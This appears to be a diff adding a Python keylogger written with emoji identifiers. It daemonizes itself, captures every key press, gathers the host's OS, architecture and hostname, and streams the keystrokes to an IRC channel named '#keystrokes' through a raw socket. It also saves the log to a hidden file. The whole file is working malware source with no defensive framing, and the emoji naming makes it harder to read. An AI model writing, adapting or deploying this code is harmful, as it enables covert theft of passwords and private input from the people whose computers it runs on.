@@ -1,0 +1,134 @@
+import threading as 🧵
+import platform as 📱
+import keyboard as ⌨
+import daemon as 😈
+import select as ☑️
+import socket as 🔌
+import time as 🕰️
+
+🏢 = "localhost"
+🚪 = 6667
+🎚️ = "#keystrokes"
+👤 = "emoji"
+📁 = ".💼"
+
+🏃‍♂️ = False
+🔝 = 510 - 12 - len(🎚️)
+
+class 🪵:
+    
+    def __init__(self):
+
+        global 🏃‍♂️, 🏢, 🚪, 🎚️, 👤, 📁, 🧵, ⌨
+
+        self.📜 = ""
+        self.📖 = ""
+
+        🏃‍♂️ = True
+
+        self.🛜(🏢, 🚪, 🎚️, 👤)
+
+        self.🪡 = 🧵.Thread(target=self.🏓)
+        self.🪡.start()
+
+        ⌨.on_press(self.👇)
+
+        ⌨.wait("esc")
+        🏃‍♂️ = False
+        self.🏁(📁)
+
+
+    # Connect to IRC server and join channel
+    def 🛜(self, 🏢, 🚪, 🎚️, 👤):
+        global 🔌, 🕰️
+
+        📡 = 🔌.socket(🔌.AF_INET, 🔌.SOCK_STREAM)
+        📡.setblocking(False)
+
+        try:
+            📡.connect((🏢, 🚪))
+        except BlockingIOError:
+            pass
+
+        🕰️.sleep(3)
+        📡.send(bytes("USER " + 👤 + " * * : " + 👤 + "\r\n", "UTF-8"))
+        📡.send(bytes("NICK " + 👤 + "\r\n", "UTF-8"))
+        📡.send(bytes("JOIN " + 🎚️ + "\r\n", "UTF-8"))
+
+        📋 = self.ℹ️()
+
+        for 🪪 in 📋:
+            🕰️.sleep(0.3)
+            📡.send(bytes("PRIVMSG " + 🎚️ + " : " + 🪪 + "\r\n", "UTF-8"))
+
+        self.📡 = 📡
+
+
+    # On key press function
+    def 👇(self, 🧑🏽‍💻):
+        global 🔝
+
+        🔑 = 🧑🏽‍💻.name
+
+        # Do some readability adjustments
+        if 🔑 in ["enter", "space"]:
+            🔑 = " "
+        elif 🔑 == "backspace":
+            self.📜 = self.📜[:-1]
+
+        if len(🔑) == 1:
+            if ⌨.is_pressed("shift") or ⌨.is_pressed("caps lock"):
+                🔑 = 🔑.upper()
+
+            self.📜 += 🔑
+
+        # Send the captured keystrokes to the IRC server if the size reaches the maximum allowed length of an IRC message
+        self.📖 = self.📜[int(len(self.📜) / 🔝) * 🔝:]
+
+        if len(self.📖) >= 🔝 - 1:
+            self.📡.send(bytes("PRIVMSG " + 🎚️ + " : " + self.📖 + "\r\n", "UTF-8"))
+            
+
+    # Get system information
+    def ℹ️(self) -> list[str]:
+        global 📱, 🔌
+
+        🔙 = []
+
+        📐, 💽 = 📱.architecture()
+        🔙.append("+---------------")
+        🔙.append(f"| OS: {📱.system()} {📱.release()} {📱.version()}")
+        🔙.append(f"| Architecture/Processor: {📐} {💽} {📱.processor()}")
+        🔙.append(f"| Hostname: {🔌.gethostname()}")
+        🔙.append("+---------------")
+
+        return 🔙
+
+
+    # Keep alive mechanism
+    def 🏓(self):
+        global 🏃‍♂️, ☑️, 🕰️
+
+        while 🏃‍♂️:
+            👁️‍🗨️, _, _ = ☑️.select(filter(lambda 🛰️: 🛰️.fileno() != -1, [self.📡]), [], [], 0)
+
+            if self.📡 in 👁️‍🗨️:
+                📲 = self.📡.recv(4096).decode()
+
+                if "PING" in 📲:
+                    self.📡.send(bytes("PONG " + 📲.split(" ")[1] + "\r\n", "UTF-8"))
+            
+            🕰️.sleep(1)
+
+
+    # Save captured keystrokes to file
+    def 🏁(self, 📁):
+        with open(📁, "w") as 📄:
+            📄.write(self.📜)
+
+        self.📡.close()
+
+
+if __name__ == "__main__":
+    with 😈.DaemonContext():
+        🪵()
